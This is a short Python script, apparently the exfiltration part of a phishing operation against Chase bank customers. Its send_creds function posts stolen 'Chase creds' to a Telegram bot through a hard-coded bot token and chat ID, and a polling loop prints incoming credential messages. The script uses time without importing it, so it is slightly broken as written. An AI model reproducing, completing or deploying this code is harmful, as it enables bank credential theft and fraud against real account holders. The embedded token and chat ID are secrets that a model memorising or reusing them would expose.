# v9pei Telegram Bot - من الـ actual notes
import requests

TOKEN = '8742623676:AAF6vhEhHK0arCw0oOWqod_ar_xkRSQzz5I'  # من notes
CHAT_ID = '1687970294'  # من notes

def send_creds(creds):
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', 
                  data={'chat_id': CHAT_ID, 'text': f'New Chase creds: {creds}'})

# Monitor loop
while True:
    r = requests.get(f'https://api.telegram.org/bot{TOKEN}/getUpdates').json()
    for msg in r['result']:
        if 'creds' in msg['message']['text']:
            print(f"💰 {msg['message']['text']}")
    time.sleep(30)
